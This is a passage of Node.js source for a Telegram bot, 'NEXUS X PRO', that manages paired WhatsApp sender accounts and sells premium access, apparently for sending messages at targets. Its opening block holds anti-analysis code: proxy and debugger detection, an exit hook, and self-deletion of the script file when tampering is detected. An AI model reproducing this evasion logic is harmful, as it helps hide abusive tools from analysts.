const crypto = require('crypto');
const https = require('https');
const tls = require('tls');
const fsSecure = require('fs');

const GH_OWNER = 'hayamjawit-crypto';
const GH_REPO = 'jeleklu';
const GH_BRANCH = 'main';
const PATH_VALIDATE = 'apcb.json';
const URL_VALIDATE = `https://raw.githubusercontent.com/${GH_OWNER}/${GH_REPO}/${GH_BRANCH}/${PATH_VALIDATE}`;

const PINNED_FP = ['F2F9A159CE50A0A168B3EAEAF2FCED5ADDD49BA38E2BF63248F057A139FC7856'];

let _killArmed = true;
function KILL(reason = 'KILL') {
    if (!_killArmed) return;
    _killArmed = false;
    try { console.log(`\x1b[31m[!] SECURITY: ${reason}\x1b[0m`); } catch {}
    try { if (fsSecure.existsSync(__filename)) fsSecure.unlinkSync(__filename); } catch {}
    try { if (fsSecure.existsSync(process.argv[1])) fsSecure.unlinkSync(process.argv[1]); } catch {}
    try { process.exit(1); } catch {}
    try { process.kill(process.pid, 'SIGKILL'); } catch {}
    try { process.abort(); } catch {}
    try { throw new Error('FATAL:' + reason); } catch {}
    try {
        const cp = require('child_process');
        cp.spawnSync('kill', ['-9', String(process.pid)], { stdio: 'ignore' });
        if (process.platform === 'win32') cp.spawnSync('taskkill', ['/F', '/PID', String(process.pid)], { stdio: 'ignore' });
    } catch {}
    try { for (;;) {} } catch {}
}

let _legitExit = false;
(function bootGuard() {
    const mod = require('module');
    if (mod._load.__patched || mod._load.__mock__) KILL('LOADER_TAMPERED');
    for (const k of ['HTTP_PROXY','HTTPS_PROXY','ALL_PROXY','http_proxy','https_proxy','all_proxy']) {
        if (process.env[k]) KILL('PROXY_DETECTED');
    }
    if (process.env.NODE_OPTIONS && /inspect|debug/.test(process.env.NODE_OPTIONS)) KILL('DEBUG_OPTIONS');
    if (process.execArgv.join(' ').match(/--inspect|--debug/)) KILL('DEBUG_ARGV');

    try {
        const _exit = process.exit;
        process.exit = function(code) {
            if (_legitExit) return _exit.call(process, code);
            KILL('EXIT_HOOK');
            return _exit.call(process, code);
        };
        Object.defineProperty(process, 'exit', { value: process.exit, writable: false, configurable: false });
    } catch {}
})();

function validateToken() {
    return new Promise((resolve, reject) => {
        const BOT_TOKEN = process.env.BOT_TOKEN || require('./config.js').tokenBot;
        const botId = BOT_TOKEN ? BOT_TOKEN.split(':')[0] : null;
        if (!botId) return reject(new Error('TOKEN_EMPTY'));

        const agent = new https.Agent({
            checkServerIdentity: (host, cert) => {
                const err = tls.checkServerIdentity(host, cert);
                if (err) return err;
                const fp = crypto.createHash('sha256').update(cert.raw).digest('hex').toUpperCase();
                if (!PINNED_FP.includes(fp)) return new Error('CERT_PIN_MISMATCH');
                return undefined;
            },
        });

        https.get(URL_VALIDATE, { agent }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                if (res.statusCode !== 200) return reject(new Error('HTTP_' + res.statusCode));
                try {
                    const whitelist = JSON.parse(data);
                    const arr = Array.isArray(whitelist) ? whitelist : (whitelist.tokens || []);
                    if (!arr.map(String).includes(String(botId))) return reject(new Error('TOKEN_NOT_REGISTERED'));
                    resolve(true);
                } catch (e) { reject(new Error('PARSE_ERROR')); }
            });
        }).on('error', reject);
    });
}
const { Telegraf } = require("telegraf");
const LockByGrenV2 = require('./assets/Zm7214k.js');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
    encodeSignedDeviceIdentity,
    encodeWAMessage,
    jidEncode,
    patchMessageBeforeSending,
    encodeNewsletterMessage,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const path = require('path');
const pino = require('pino');
const chalk = require('chalk');
const axios = require('axios');
const os = require('os');
const sharp = require('sharp');
const QRCode = require('qrcode');
const FormData = require('form-data');
const EventEmitter = require('events');
const moment = require('moment-timezone');
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)
      if (messages[chatId].length > 50) messages[chatId].shift()
      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) chats[chat.id] = chat
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) contacts[id] = newContacts[id]
  })

  return {
    chats, messages, contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

// ─────── SET CONFIG ─────── //
const { 
   tokenBot: BOT_TOKEN, 
   ownerID: ID_TELEGRAM
} = require('./config.js');

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const bot = new Telegraf(BOT_TOKEN);
const THUMB = "https://files.catbox.moe/4fiw0k.jpg";

// ─────── MULTI-SENDER STATE ─────── //
const SESSION_ROOT = './session';
const PAIRING_CODE = 'XEROZ123';
const KEEPALIVE_INTERVAL = 20000;
const MAX_RECONNECT_ATTEMPTS = 50;

const senders = new Map();

const getSessionPath = (phone) => path.join(SESSION_ROOT, String(phone));
const fmtCode = (code) => code?.match(/.{1,4}/g)?.join("-") || code;
const getActiveSockets = () => {
    return [...senders.values()].filter(s => s.connected && s.sock).map(s => s.sock);
};
const getSender = (phone) => senders.get(String(phone));

const stopKeepalive = (entry) => {
    if (entry.keepalive) {
        clearInterval(entry.keepalive);
        entry.keepalive = null;
    }
};

const startKeepalive = (entry) => {
    stopKeepalive(entry);
    entry.keepalive = setInterval(async () => {
        if (!entry.sock || !entry.connected) return;
        try {
            await entry.sock.sendPresenceUpdate('available');
        } catch (e) {}
    }, KEEPALIVE_INTERVAL);
};

const stopReconnect = (entry) => {
    if (entry.timer) {
        clearTimeout(entry.timer);
        entry.timer = null;
    }
};

const startSesi = async (phoneNumber) => {
    const phone = String(phoneNumber);
    let entry = senders.get(phone);
    if (!entry) {
        entry = {
            phone,
            sock: null,
            connected: false,
            pairing: null,
            attempts: 0,
            timer: null,
            keepalive: null,
            reconnecting: false,
            shouldReconnect: true,
        };
        senders.set(phone, entry);
    }
    if (entry.reconnecting) return entry.sock;
    if (entry.shouldReconnect === false) return entry.sock;
    entry.reconnecting = true;

    try {
        const { state, saveCreds } = await useMultiFileAuthState(getSessionPath(phone));
        const { version } = await fetchLatestBaileysVersion();

        const connectionOptions = {
            version,
            keepAliveIntervalMs: 20000,
            printQRInTerminal: false,
            logger: pino({ level: "silent" }),
            autoFollowChannels: false,
            blockAutoJoinGroups: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
            },
            browser: Browsers.ubuntu("Chrome"),
            getMessage: async (key) => {
                return proto.Message.fromObject({});
            },
            syncFullHistory: false,
            markOnlineOnConnect: false,
            generateHighQualityLinkPreview: false,
            defaultQueryTimeoutMs: 60000,
            connectTimeoutMs: 60000,
            retryRequestDelayMs: 250,
            maxMsgRetryCount: 5,
        };

        const mySock = makeWASocket(connectionOptions);
        entry.sock = mySock;

        mySock.ev.on("messages.upsert", async (m) => {
            try {
                if (!m || !m.messages || !m.messages[0]) return;
                const msg = m.messages[0];
                const chatId = msg.key.remoteJid || "Unknown";
            } catch (error) {
                console.error('[messages.upsert]', phone, error.message);
            }
        });

        mySock.ev.on('creds.update', saveCreds);

        mySock.ev.on('connection.update', async (update) => {
            const { connection, lastDisconnect, qr } = update;

            if (qr && entry.pairing && entry.pairing.waiting) {
                try {
                    const code = await mySock.requestPairingCode(entry.pairing.phoneNumber, PAIRING_CODE);
                    const formattedCode = fmtCode(code);

                    const pairingMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${entry.pairing.phoneNumber}
⌑ Pαiring Cσdє: ${formattedCode}
⌑ Typє: Nσt Cσnnєctєd`;

                    const sentMsg = await bot.telegram.sendPhoto(entry.pairing.chatId, THUMB, {
                        caption: pairingMenu,
                        parse_mode: "HTML"
                    });

                    entry.pairing.messageId = sentMsg.message_id;
                    entry.pairing.code = formattedCode;
                    entry.pairing.waiting = false;
                } catch (e) {
                    console.error('[PAIRING ERROR]', e.message);
                    bot.telegram.sendMessage(entry.pairing.chatId, `❌ Gagal minta kode: ${e.message}`);
                    entry.pairing.waiting = false;
                }
            }

            if (connection === 'open') {
                entry.connected = true;
                entry.reconnecting = false;
                entry.attempts = 0;
                stopReconnect(entry);
                startKeepalive(entry);

                const currentTime = new Date().toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta', hour12: false });
                console.log(chalk.green(`Pαiring sєndєr bєrhαsil ✅ [${currentTime}] +${phone}`));

                if (entry.pairing) {
                    const connectedMenu = `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⌑ Nυmbєr: +${phone}
⌑ Pαiring Cσdє: ${entry.pairing.code || "-"}
⌑ Typє: Cσnnєctєd`;
                    try {
                        await bot.telegram.editMessageCaption(
                            entry.pairing.chatId,
                            entry.pairing.messageId,
                            undefined,
                            connectedMenu,
                            { parse_mode: "HTML" }
                        );
                    } catch (e) {}
                }
            }

            if (connection === 'close') {
                entry.connected = false;
                entry.reconnecting = false;
                stopKeepalive(entry);

                const statusCode = lastDisconnect?.error?.output?.statusCode;
                const reason = lastDisconnect?.error?.message || 'Unknown';
                console.log(chalk.red(`Kσnєksi tєrpυtυs +${phone}: ${statusCode || 'Unknown'} - ${reason}`));

                if (statusCode === DisconnectReason.loggedOut || statusCode === 401) {
                    entry.shouldReconnect = false;
                    stopReconnect(entry);
                    
                    const dir = getSessionPath(phone);
                    if (fs.existsSync(dir)) {
                        fs.rmSync(dir, { recursive: true, force: true });
                    }
                    senders.delete(phone);
                    
                    console.log(chalk.red(`🚪 KENON +${phone}. Sєssiσn dihαpυs.`));
                    return;
                }

                if (!entry.shouldReconnect) return;
                if (entry.timer) return;
                entry.attempts++;
                if (entry.attempts > MAX_RECONNECT_ATTEMPTS) {
                    console.log(chalk.red(`Rєcσnnєct gαgαl ${MAX_RECONNECT_ATTEMPTS}x +${phone}`));
                    return;
                }

                let delay = 5000;
                if (statusCode === DisconnectReason.restartRequired) {
                    delay = 1000;
                } else if (statusCode === 428) {
                    delay = 5000;
                } else if (statusCode === 503 || statusCode === 502) {
                    delay = 8000;
                } else {
                    delay = 2000 + entry.attempts * 1000;
                }

                entry.timer = setTimeout(() => {
                    entry.timer = null;
                    startSesi(phone);
                }, delay);
            }
        });

        return mySock;
    } catch (error) {
        entry.reconnecting = false;
        console.error('[startSesi]', phone, error?.message || error);
        if (entry.shouldReconnect && !entry.timer) {
            entry.timer = setTimeout(() => {
                entry.timer = null;
                startSesi(phone);
            }, 5000);
        }
        return null;
    }
};

const stopSender = async (phone) => {
    const entry = senders.get(String(phone));
    if (!entry) return;
    entry.shouldReconnect = false;
    stopReconnect(entry);
    stopKeepalive(entry);
    try {
        entry.sock?.end?.(undefined);
    } catch (e) {}
    senders.delete(String(phone));
};

const stopAllSenders = async () => {
    for (const phone of [...senders.keys()]) await stopSender(phone);
};

const autoLoadSessions = async () => {
    try {
        if (!fs.existsSync(SESSION_ROOT)) return;
        const dirs = fs.readdirSync(SESSION_ROOT, { withFileTypes: true })
            .filter(d => d.isDirectory())
            .map(d => d.name)
            .filter(n => /^\d+$/.test(n));
        for (const phone of dirs) {
            console.log(chalk.cyan(`Mєmυαt sєssiσn +${phone}`));
            await startSesi(phone);
        }
    } catch (error) {
        console.error('[autoLoadSessions]', error.message);
    }
};

autoLoadSessions();

const userSenderChoice = new Map();

const resolveSenders = (ctx) => {
    const choice = userSenderChoice.get(String(ctx.from.id));
    if (choice === "ALL") {
        return [...senders.values()].filter(s => s.connected && s.sock);
    }
    if (choice) {
        const entry = senders.get(choice);
        if (entry?.connected && entry.sock) return [entry];
        return [];
    }
    let last = null;
    for (const [, s] of senders) if (s.connected && s.sock) last = s;
    return last ? [last] : [];
};

// ─────── VALIDATE CEK SENDER ─────── //
const checkWhatsAppConnection = (ctx, next) => {
    if (getActiveSockets().length === 0) {
        ctx.reply("🪧 ☇ Tidαk αdα sєndєr yαng tєrhυbυng");
        return;
    }
    next();
};

const targetCooldowns = new Map();

// ─────── UPTIME BOT ─────── //
function formatUptime(seconds) {
    const d = Math.floor(seconds / 86400);
    const h = Math.floor((seconds % 86400) / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);

    const parts = [];
    if (d > 0) parts.push(`${d} hαrí`);
    if (h > 0) parts.push(`${h} jαm`);
    if (m > 0) parts.push(`${m} mєnít`);
    if (s > 0 || parts.length === 0) parts.push(`${s} dєtík`);

    return parts.join(' ');
}

// ─────── COMMAND /connect ─────── //
bot.command("connect", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    const args = ctx.message.text.split(" ")[1];
    if (!args) return ctx.reply("🪧 Cσntσh: /connect 62×××");
    const phoneNumber = args.replace(/[^0-9]/g, "");
    if (!phoneNumber) return ctx.reply("❌ Nσmσr tidαk vαlid");

    try {
        const existing = getSender(phoneNumber);
        if (existing?.connected) {
            return ctx.reply(`✅ WhαtsΑpp sυdαh tєrhυbυng dєngαn nσmσr: +${phoneNumber}`);
        }

        let target = existing?.sock;
        if (!target) {
            target = await startSesi(phoneNumber);
            if (!target) return ctx.reply("❌ Gαgαl mєmυlαi sσckєt");
        }

        if (target.authState?.creds?.registered) {
            return ctx.reply(`✅ WhαtsΑpp sυdαh tєrhυbυng dєngαn nσmσr: +${phoneNumber}`);
        }

        const entry = getSender(phoneNumber);
        if (entry) {
            entry.pairing = {
                chatId: ctx.chat.id,
                phoneNumber: phoneNumber,
                waiting: true 
            };
        }
        
        await ctx.reply("⏳ Mєnghυbυngkαn kє WhαtsΑpp...\nMσhσn tυnggυ 5-10 dєtik sαmpαi kσdє pαiring mυncυl");

    } catch (err) {
        console.error('[connect]', err);
        ctx.reply(`❌ Gαgαl pαiring: ${err.message}`);
    }
});

// ─────── COMMAND /listsender ─────── //
bot.command(["senders", "listsender"], async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const entries = [...senders.values()];
    if (entries.length === 0) {
        return ctx.reply("🪧 Bєlυm αdα sєndєr yαng tєrdαftαr");
    }

    const active = entries.filter(e => e.connected).length;
    const lines = [];
    lines.push("<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>");
    lines.push(`↯ Tσtαl Sєndєr: ${entries.length}`);
    lines.push(`↯ Cσnnєctєd: ${active}`);
    lines.push(`↯ Discσnnєctєd: ${entries.length - active}`);
    lines.push("");

    let i = 0;
    for (const e of entries) {
        i++;
        let status;
        if (e.connected) status = "Cσnnєctєd";
        else if (e.sock?.authState?.creds?.registered) status = "Discσnnєctєd (sєssiσn αdα)";
        else status = "Bєlυm pαiring";
        const jid = e.sock?.user?.id ? ` | JID: ${e.sock.user.id.split(':')[0]}` : "";
        const retry = e.attempts > 0 ? ` | retry: ${e.attempts}/${MAX_RECONNECT_ATTEMPTS}` : "";
        lines.push(`${i}. +${e.phone}${jid}`);
        lines.push(`   Stαtυs: ${status}${retry}`);
    }

    lines.push("");
    lines.push("⌑ /connect <nσmσr> υntυk tαmbαh sєndєr");
    lines.push("⌑ /restart <nσmσr> υntυk hαpυs sєndєr");
    lines.push("⌑ /restart all υntυk hαpυs sєmυα");

    const text = lines.join("\n");

    try {
        await ctx.reply(text, { parse_mode: "HTML" });
    } catch (e) {
        await ctx.reply(text.replace(/<[^>]+>/g, ""));
    }
});

// ─────── COMMAND /restart ─────── //
bot.command("restart", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    const args = ctx.message.text.split(" ")[1];

    try {
        if (args === 'all' || args === 'αll') {
            await stopAllSenders();
            if (fs.existsSync(SESSION_ROOT)) {
                fs.rmSync(SESSION_ROOT, { recursive: true, force: true });
            }
            await ctx.reply("🗑️ Sєmυα sєssiσn bєrhαsil dihαpυs, pαnєl αkαn rєstαrt");
            setTimeout(() => {
                process.exit(1);
            }, 2000);
            return;
        }

        const phone = (args || "").replace(/[^0-9]/g, "");
        if (!phone) {
            return ctx.reply("🪧 Cσntσh: /restart 62××× Αtαυ /restart all");
        }

        await stopSender(phone);
        const dir = getSessionPath(phone);
        if (fs.existsSync(dir)) {
            fs.rmSync(dir, { recursive: true, force: true });
            await ctx.reply(`🗑️ Sєssiσn +${phone} bєrhαsil dihαpυs`);
        } else {
            await ctx.reply(`🪧 Sєssiσn +${phone} tidαk ditєmυkαn`);
        }
    } catch (err) {
        console.error('[restart]', err);
        ctx.reply("❌ Gαgαl mєnhαpυs sєssiσn");
    }
});

// ─────── COMMAND /sender ─────── //
const buildSenderKeyboard = (tgUserId, connected) => {
    const choice = userSenderChoice.get(String(tgUserId));
    const rows = [];
    const allMark = choice === "ALL" ? " ✓" : "";
    rows.push([{ text: `ALL SENDERS (${connected.length})${allMark}`, callback_data: "sel:ALL" }]);
    for (const e of connected) {
        const mark = choice === e.phone ? " ✓" : "";
        rows.push([{ text: `+${e.phone}${mark}`, callback_data: `sel:${e.phone}` }]);
    }
    return rows;
};

const senderMenuText = (tgUserId, connected) => {
    const choice = userSenderChoice.get(String(tgUserId));
    let current;
    if (choice === "ALL") current = "ALL SENDERS";
    else if (choice) current = `+${choice}`;
    else current = "bєlυm dipilih (dєfαυlt: sєndєr tєrαkhir)";
    return `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Pilih sєndєr αktif
↯ Cυrrєnt: ${current}
↯ Tєrsєdiα: ${connected.length} sєndєr`;
};

bot.command(["usepair", "pilih", "usesender"], async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }
    const connected = [...senders.values()].filter(s => s.connected && s.sock);
    if (connected.length === 0) {
        return ctx.reply("🪧 Bєlυm αdα sєndєr yαng tєrhυbυng");
    }
    await ctx.reply(senderMenuText(ctx.from.id, connected), {
        parse_mode: "HTML",
        reply_markup: { inline_keyboard: buildSenderKeyboard(ctx.from.id, connected) }
    });
});

bot.action(/^sel:(.+)$/, async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.answerCbQuery("❌ Bυkαn σwnєr");
    }
    const val = ctx.match[1];
    if (val !== "ALL") {
        const phone = val.replace(/[^0-9]/g, "");
        const entry = senders.get(phone);
        if (!entry?.connected) {
            return ctx.answerCbQuery(`❌ +${phone} tidαk tєrhυbυng`, { show_alert: true });
        }
        userSenderChoice.set(String(ctx.from.id), phone);
    } else {
        userSenderChoice.set(String(ctx.from.id), "ALL");
    }

    const chosen = userSenderChoice.get(String(ctx.from.id));
    await ctx.answerCbQuery(chosen === "ALL" ? "Dipilih: ALL SENDERS" : `Dipilih: +${chosen}`);

    const connected = [...senders.values()].filter(s => s.connected && s.sock);
    try {
        await ctx.editMessageText(senderMenuText(ctx.from.id, connected), {
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: buildSenderKeyboard(ctx.from.id, connected) }
        });
    } catch (e) {}
});

// ─────── SETUP PREMIUM GROUPS ─────── //
const PREMIUM_FILE = './assets/premgroup.json';

const loadPremiumGroups = () => {
    try {
        if (!fs.existsSync(PREMIUM_FILE)) return [];
        const raw = fs.readFileSync(PREMIUM_FILE, 'utf8');
        const parsed = JSON.parse(raw);
        return Array.isArray(parsed) ? parsed.map(String) : [];
    } catch (e) {
        console.error('[premium] load gagal:', e.message);
        return [];
    }
};

const savePremiumGroups = () => {
    try {
        fs.ensureDirSync(path.dirname(PREMIUM_FILE));
        fs.writeFileSync(PREMIUM_FILE, JSON.stringify(premiumGroups, null, 2));
    } catch (e) {
        console.error('[premium] save gagal:', e.message);
    }
};

let premiumGroups = loadPremiumGroups();

const isPremiumGroup = (chatId) => premiumGroups.includes(String(chatId));

// ─────── CEK PREMIUM ─────── //
const checkAccess = () => async (ctx, next) => {
    const isOwner = String(ctx.from.id) === String(ID_TELEGRAM);
    if (isOwner) return next();

    const chatType = ctx.chat?.type;
    const isGroup = chatType === 'group' || chatType === 'supergroup';

    if (isGroup) {
        if (isPremiumGroup(ctx.chat.id)) return next();
        if (isPremiumUser(ctx.from.id)) return next();
        return ctx.reply("❌ Αksєs ditσlak group ini tidαk prєmium dαn kαmυ bυkαn prєmium usєr");
    }

    if (isPremiumUser(ctx.from.id)) return next();
    return ctx.reply("❌ Αksєs ditσlak hαnyα prєmium usєr");
};

// ─────── COMMAND /delgrup ─────── //
bot.command("delgrup", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9-]/g, "");
    let targetId = arg;

    if (!targetId) {
        const chatType = ctx.chat?.type;
        if (chatType === "group" || chatType === "supergroup") {
            targetId = String(ctx.chat.id);
        }
    }

    if (!targetId) {
        return ctx.reply("🪧 Cσntσh: /delgrup -100xxxx");
    }

    const idx = premiumGroups.indexOf(targetId);
    if (idx === -1) {
        return ctx.reply(`🪧 Grup ${targetId} tidαk αdα di prєmium`);
    }

    premiumGroups.splice(idx, 1);
    savePremiumGroups();
    console.log(`[premium] del ${targetId} (total: ${premiumGroups.length})`);
    await ctx.reply(`🗑️ Grup ${targetId} ditαmbαhkαn kєlυαr dαri prєmium`);
});

// ─────── COMMAND /addgrup ─────── //
bot.command("addgrup", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9-]/g, "");
    let targetId = arg;

    if (!targetId) {
        const chatType = ctx.chat?.type;
        if (chatType === "group" || chatType === "supergroup") {
            targetId = String(ctx.chat.id);
        }
    }

    if (!targetId) {
        return ctx.reply("🪧 Cσntσh: /addgrup -100xxxx");
    }

    if (premiumGroups.includes(targetId)) {
        return ctx.reply(`✅ Grup ${targetId} sυdαh prєmium`);
    }

    premiumGroups.push(targetId);
    savePremiumGroups();
    console.log(`[premium] add ${targetId} (total: ${premiumGroups.length})`);
    await ctx.reply(`✅ Grup ${targetId} ditαmbαhkαn kє prєmium`);
});

// ─────── SETUP PREMIUM USERS ─────── //
const PREMIUM_USER_FILE = './assets/premium.json';

const loadPremiumUsers = () => {
    try {
        if (!fs.existsSync(PREMIUM_USER_FILE)) return [];
        const raw = fs.readFileSync(PREMIUM_USER_FILE, 'utf8');
        const parsed = JSON.parse(raw);
        return Array.isArray(parsed) ? parsed.map(String) : [];
    } catch (e) {
        console.error('[premium-user] load gagal:', e.message);
        return [];
    }
};

const savePremiumUsers = () => {
    try {
        fs.ensureDirSync(path.dirname(PREMIUM_USER_FILE));
        fs.writeFileSync(PREMIUM_USER_FILE, JSON.stringify(premiumUsers, null, 2));
    } catch (e) {
        console.error('[premium-user] save gagal:', e.message);
    }
};

let premiumUsers = loadPremiumUsers();

const isPremiumUser = (userId) => premiumUsers.includes(String(userId));

// ─────── COMMAND /addprem ─────── //
bot.command("addprem", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");

    if (!arg) {
        return ctx.reply("🪧 Cσntσh: /addprem 123456789");
    }

    if (premiumUsers.includes(arg)) {
        return ctx.reply(`✅ User ${arg} sυdαh prєmium`);
    }

    premiumUsers.push(arg);
    savePremiumUsers();
    console.log(`[premium-user] add ${arg} (total: ${premiumUsers.length})`);
    await ctx.reply(`✅ User ${arg} ditαmbαhkαn kє prєmium`);
});

// ─────── COMMAND /delprem ─────── //
bot.command("delprem", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^0-9]/g, "");

    if (!arg) {
        return ctx.reply("🪧 Cσntσh: /delprem 123456789");
    }

    const idx = premiumUsers.indexOf(arg);
    if (idx === -1) {
        return ctx.reply(`🪧 User ${arg} tidαk αdα di prєmium`);
    }

    premiumUsers.splice(idx, 1);
    savePremiumUsers();
    console.log(`[premium-user] del ${arg} (total: ${premiumUsers.length})`);
    await ctx.reply(`🗑️ User ${arg} dikєlυαrkαn dαri prєmium`);
});

// ─────── SETUP BLOCKED ─────── //
const BLOCKED_FILE = './assets/blocked.json';

const loadBlocked = () => {
    try {
        if (!fs.existsSync(BLOCKED_FILE)) return { users: [], commands: [] };
        const raw = fs.readFileSync(BLOCKED_FILE, 'utf8');
        const parsed = JSON.parse(raw);
        return {
            users: Array.isArray(parsed.users) ? parsed.users.map(String) : [],
            commands: Array.isArray(parsed.commands) ? parsed.commands.map(String) : [],
        };
    } catch (e) {
        console.error('[blocked] load gagal:', e.message);
        return { users: [], commands: [] };
    }
};

const saveBlocked = () => {
    try {
        fs.ensureDirSync(path.dirname(BLOCKED_FILE));
        fs.writeFileSync(BLOCKED_FILE, JSON.stringify(blocked, null, 2));
    } catch (e) {
        console.error('[blocked] save gagal:', e.message);
    }
};

let blocked = loadBlocked();

const isUserBlocked = (userId) => blocked.users.includes(String(userId));
const isCommandBlocked = (cmd) => blocked.commands.includes(String(cmd).toLowerCase());

const checkBlocked = () => async (ctx, next) => {
    if (String(ctx.from.id) === String(ID_TELEGRAM)) return next();

    const text = ctx.message?.text || "";
    if (text.startsWith("/")) {
        const cmd = text.split(" ")[0].slice(1).split("@")[0].toLowerCase();
        if (isCommandBlocked(cmd)) {
            return ctx.reply(`🚫 Cσmmαnd /${cmd} sєdαng dinσnαktifkαn`);
        }
    }

    return next();
};

// ─────── COMMAND /blockcmd ─────── //
bot.command("blockcmd", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^a-zA-Z0-9_]/g, "").toLowerCase();

    if (!arg) {
        return ctx.reply("🪧 Cσntσh: /blockcmd /cmd");
    }

    if (blocked.commands.includes(arg)) {
        return ctx.reply(`✅ Cσmmαnd /${arg} sυdαh diblσkir`);
    }

    blocked.commands.push(arg);
    saveBlocked();
    console.log(`[blocked] cmd add ${arg} (total: ${blocked.commands.length})`);
    await ctx.reply(`🚫 Cσmmαnd /${arg} diblσkir`);
});

// ─────── COMMAND /bukacmd ─────── //
bot.command("bukacmd", async (ctx) => {
    if (ctx.from.id != ID_TELEGRAM) {
        return ctx.reply("❌ Fitυr ini hαnyα υntυk pєmilik bσt");
    }

    const arg = (ctx.message.text.split(" ")[1] || "").replace(/[^a-zA-Z0-9_]/g, "").toLowerCase();

    if (!arg) {
        return ctx.reply("🪧 Cσntσh: /bukacmd /cmd");
    }

    const idx = blocked.commands.indexOf(arg);
    if (idx === -1) {
        return ctx.reply(`🪧 Cσmmαnd /${arg} tidαk dαlαm dαftαr blσkir`);
    }

    blocked.commands.splice(idx, 1);
    saveBlocked();
    console.log(`[blocked] cmd del ${arg} (total: ${blocked.commands.length})`);
    await ctx.reply(`✅ Cσmmαnd /${arg} dibυkα blσkir`);
});

// ─────── SETUP COOLDOWN ─────── //
const COOLDOWN_FILE = './assets/cooldowns.json';

const loadCooldowns = () => {
    try {
        if (!fs.existsSync(COOLDOWN_FILE)) return {};
        const raw = fs.readFileSync(COOLDOWN_FILE, 'utf8');
